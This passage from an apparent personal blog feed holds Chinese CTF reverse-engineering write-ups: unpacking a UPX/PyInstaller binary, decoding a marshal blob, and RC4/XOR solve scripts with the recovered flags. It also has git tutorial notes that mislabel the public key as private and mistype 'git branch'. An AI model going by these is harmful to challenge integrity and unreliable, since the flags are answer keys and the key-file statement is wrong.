<span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x7D</span>]</span><br><span class="line">rand = [<span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0xD6</span>, <span class="number">0x13</span>, <span class="number">0xCC</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0xA8</span>, <span class="number">0xF4</span>, <span class="number">0x96</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    last[i]+=mask[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    last[i]^=rand[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">32</span>):</span><br><span class="line">    last[i]^=last[i-<span class="number">16</span>]</span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># WKCTF&#123;08898c40064d1fc4836db94fe&#125;</span></span><br></pre></td></tr></table></figure><p>这里应当先执行第一个解密再执行第二个解密，这样第二轮解密才能用当时异或的值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;very-easy-该题未做出&quot;&gt;&lt;a href=&quot;#very-easy-该题未做出&quot; class=&quot;headerlink&quot; title=&quot;very_easy[该题未做出]&quot;&gt;&lt;/a&gt;very_easy[该题未做出]&lt;/h2&gt;&lt;p&gt;根据&lt;a href=&quot;https</summary>
      
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>git基本操作</title>
    <link href="https://www.pri87.vip/posts/ab9e1965.html"/>
    <id>https://www.pri87.vip/posts/ab9e1965.html</id>
    <published>2024-07-16T01:04:14.000Z</published>
    <updated>2024-07-16T01:36:23.957Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git学习"><a href="#Git学习" class="headerlink" title="Git学习"></a>Git学习</h2><p>易于调试优化迭代，用于版本管理</p><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h3><p>历史记录，还原内容</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="创建本地仓库"><a href="#创建本地仓库" class="headerlink" title="创建本地仓库"></a>创建本地仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir xxx</span><br><span class="line">cd xxx</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p>配置用户名&#x2F;邮箱</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="提交内容"><a href="#提交内容" class="headerlink" title="提交内容"></a>提交内容</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add xxx #将某个内容暂存</span><br><span class="line">git add . #把所有已修改文件移到暂存区</span><br><span class="line">git status #查看当前状态</span><br><span class="line">git commit -m &quot;注释说明&quot; #提交已暂存的文件</span><br></pre></td></tr></table></figure><p>文件状态</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已修改：处于工作区</span><br><span class="line">已暂存：处于暂存区</span><br><span class="line">已提交：处于Git仓库</span><br></pre></td></tr></table></figure><p>其它命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log #查看提交记录</span><br></pre></td></tr></table></figure><h2 id="Github远程仓库操作"><a href="#Github远程仓库操作" class="headerlink" title="Github远程仓库操作"></a>Github远程仓库操作</h2><p>创建仓库后，在SSH处得到一个链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add name_of_remote_repository git@github.com:xxx</span><br></pre></td></tr></table></figure><p>配置公私钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;geekuni@geekbang.com&quot;</span><br></pre></td></tr></table></figure><p>得到了公私钥</p><p>没有pub的是私钥，有pub的是私钥</p><p>在github中找到设置SSH and FPG keys，新建，然后再key中添加pubkey内容。这样就连接好了</p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>用于验证是否可以连接上</p><p>push：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u name main #name是远程仓库名，main是分支</span><br></pre></td></tr></table></figure><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch  #查看当前分支</span><br></pre></td></tr></table></figure><p>分支只是一个指针</p><p>详见：</p><p><a href="https://blog.csdn.net/silence_pinot/article/details/111478596">git的分支管理（详细版）_git分支管理-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b new_branch_name  #创建一个新分支并切换到这个分支</span><br><span class="line">git breach -d name #删除一个分支</span><br><span class="line">git checkout main #切换回main分支</span><br><span class="line">git merge branch_name #将一个分支（快速合并，只移动指针）合并到主分支</span><br></pre></td></tr></table></figure><p>保存当前工作现场，用于临时切换分支</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash  #保存</span><br><span class="line">git stash pop  #恢复</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Git学习&quot;&gt;&lt;a href=&quot;#Git学习&quot; class=&quot;headerlink&quot; title=&quot;Git学习&quot;&gt;&lt;/a&gt;Git学习&lt;/h2&gt;&lt;p&gt;易于调试优化迭代，用于版本管理&lt;/p&gt;
&lt;h3 id=&quot;版本控制&quot;&gt;&lt;a href=&quot;#版本控制&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="开发" scheme="https://www.pri87.vip/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>暑假学习记录1</title>
    <link href="https://www.pri87.vip/posts/4ead32f4.html"/>
    <id>https://www.pri87.vip/posts/4ead32f4.html</id>
    <published>2024-07-15T14:48:40.000Z</published>
    <updated>2024-08-05T15:02:07.450Z</updated>
    
    <content type="html"><![CDATA[<div class="note info simple"><p>目录：</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">学习记录1</a> &lt;&#x3D;</p><p>学习记录2</p></div><p>想研究一下反调试，所以最近的主线是归纳反调试技术<br>之后会单独写一篇博客来汇总</p><p>然后记录一下最近写的题</p><p>以及在杂方向上面学的东西</p><hr><h2 id="wp"><a href="#wp" class="headerlink" title="wp:"></a>wp:</h2><p><a href="https://www.pri87.vip/posts/1cdc16cf.html">2024春秋杯夏 re wp</a></p><p><a href="https://www.pri87.vip/posts/4f799b15.html">WKCTF-RE部分wp</a></p><h3 id="矩阵杯packpy题目复现："><a href="#矩阵杯packpy题目复现：" class="headerlink" title="矩阵杯packpy题目复现："></a>矩阵杯packpy题目复现：</h3><p>拿到文件，是一个elf，用010打开，发现被upx过，修改一下标志，把upx?改成UPX!，用upx -d去壳</p><p>打开后，发现是一个pyinstaller打包的py文件，用工具反编译成pyc</p><p>然后uncompyle6解码主要pyc，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: packpy.py</span></span><br><span class="line"><span class="keyword">import</span> base58, zlib, marshal</span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))</span><br></pre></td></tr></table></figure><p>通过把exec改成print，可以得到这个序列化内容是一个code object</p><p>我们需要把它还原成可读的代码</p><p>在网上搜索资料的时候，发现，py在执行的时候会先被编译成PyCodeObject 对象，然后被保存到pyc文件中</p><p>可以这样导入pyc文件的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="string">&quot;你好啊&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line"> </span><br><span class="line">tools = SourcelessFileLoader(</span><br><span class="line">    <span class="string">&quot;tools&quot;</span>, <span class="string">&quot;__pycache__/tools.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(tools.a)  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(tools.b)  <span class="comment"># 你好啊</span></span><br></pre></td></tr></table></figure><p>可以猜测，marshal反序列化的内容其实可以当成pyc来看，尝试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line">a = zlib.decompress(base58.b58decode(scrambled_code_string))</span><br><span class="line"></span><br><span class="line">HEAD = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;550D0D0A000000000000000000000000&#x27;</span>) <span class="comment">#补充文件头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(HEAD+a)</span><br></pre></td></tr></table></figure><p>输出后，真的可以直接反编译，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encdata = <span class="string">b&#x27;\x18\xfa\xadd\xed\xab\xad\x9d\xe5\xc0\xad\xfa\xf9\x0be\xf9\xe5\xade6\xf9\xfd\x88\xf9\x9d\xe5\x9c\xe5\x9de\xc3))\x0f\xff&#x27;</span></span><br><span class="line">hex_output = binascii.hexlify(encdata).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">seed_value</span>):</span><br><span class="line">    key = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line">    random.shuffle(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        encrypted.append(key[byte] ^ <span class="number">95</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;input your flag:&#x27;</span>)</span><br><span class="line">    key = generate_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    data = flag.encode()</span><br><span class="line">    encrypted_data = encrypt(data, key)</span><br><span class="line">    <span class="keyword">if</span> encrypted_data == encdata:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(hex_output)</span><br><span class="line">last = [<span class="number">0x18</span>,<span class="number">0xfa</span>,<span class="number">0xad</span>,<span class="number">0x64</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0xad</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0xc0</span>,<span class="number">0xad</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x0b</span>,<span class="number">0x65</span>,<span class="number">0xf9</span>,<span class="number">0xe5</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xf9</span>,<span class="number">0xfd</span>,<span class="number">0x88</span>,<span class="number">0xf9</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0x9c</span>,<span class="number">0xe5</span>,<span class="number">0x9d</span>,<span class="number">0x65</span>,<span class="number">0xc3</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x0f</span>,<span class="number">0xff</span>]</span><br><span class="line">okey = generate_key(<span class="built_in">len</span>(last))</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> okey[j]^<span class="number">95</span>==last[i]:</span><br><span class="line">            q.append(j)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">pl(q)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mar3hal_Is_3asy_t0_r3v3rse!!@&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h2><p>配置VS asm环境，我的VS版本为2022</p><p>CSDN上面写的太抽象了，我在<a href="https://zjlc.top/2022/05/11/assembly/">Windows平台编写汇编语言</a>看到了一个不错的</p><p>大概步骤就是：</p><ul><li><a href="http://www.masm32.com/download.htm">Download The MASM32 SDK</a>下载MASM SDK</li><li>在VS installer 里面下载MSVC V140 生成工具，v141 缓解库，v141 ARM生成工具</li></ul><h2 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h2><p><a href="https://www.pri87.vip/posts/ab9e1965.html">git基本操作</a></p><p><a href="https://www.pri87.vip/posts/484c947.html">golang学习</a></p>]]></content>
    
    
    <summary type="html">暑假不许学习</summary>
    
    
    
    
    <category term="放假" scheme="https://www.pri87.vip/tags/%E6%94%BE%E5%81%87/"/>
    
    <category term="开摆" scheme="https://www.pri87.vip/tags/%E5%BC%80%E6%91%86/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯夏 re wp</title>
    <link href="https://www.pri87.vip/posts/1cdc16cf.html"/>
    <id>https://www.pri87.vip/posts/1cdc16cf.html</id>
    <published>2024-07-07T07:46:12.000Z</published>
    <updated>2024-07-07T11:14:35.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="snack"><a href="#snack" class="headerlink" title="snack"></a>snack</h2><p>pyc解包，pycdc反编译，得到一个rc4加密，复制加密过程直接解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pl</span>(<span class="params">a, b=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= x &lt;= <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> a):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (<span class="string">&#x27;&#x27;</span>.join([long_to_bytes(a[i]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>)]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> result.startswith(b):</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span><span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&#123;&#123;<span class="subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = [i^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,</span><br><span class="line">    <span class="number">205</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">235</span>,</span><br><span class="line">    <span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">130</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">120</span>,</span><br><span class="line">    <span class="number">227</span>,</span><br><span class="line">    <span class="number">193</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">162</span>,</span><br><span class="line">    <span class="number">248</span>,</span><br><span class="line">    <span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,</span><br><span class="line">    <span class="number">238</span>,</span><br><span class="line">    <span class="number">92</span>,</span><br><span class="line">    <span class="number">160</span>,</span><br><span class="line">    <span class="number">203</span>,</span><br><span class="line">    <span class="number">185</span>,</span><br><span class="line">    <span class="number">155</span>]</span><br><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(xor_key[i]))</span><br><span class="line">pl(decrypt(data, key))</span><br><span class="line"><span class="comment"># flag&#123;KMLTz3lT_MePUDa7A_P5LpzCBT&#125;</span></span><br></pre></td></tr></table></figure><h2 id="HardSignin"><a href="#HardSignin" class="headerlink" title="HardSignin"></a>HardSignin</h2><p>先去一个upx</p><p>有4个tls，里面有花和反调，去花杀反调，似乎是用随机数生成之后加密用的参数，同时对main解密</p><p><img src="https://s2.loli.net/2024/07/06/372SLiaWRdXwg8y.png" alt="image-20240706182721253"></p><p><img src="https://s2.loli.net/2024/07/06/CpvJHoiGXSOcxrA.png" alt="image-20240706195234707"></p><p><img src="https://s2.loli.net/2024/07/06/oarzEjK6tcLyWxD.png" alt="image-20240706195330050"></p><p>在tls2里面下断点到这里已经生成的数据</p><p>main里面3个步骤</p><p><img src="https://s2.loli.net/2024/07/06/igZvC3mJDLPh1Xr.png" alt="image-20240706182810516"></p><p>base64，rc4和tea直接反向解密就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 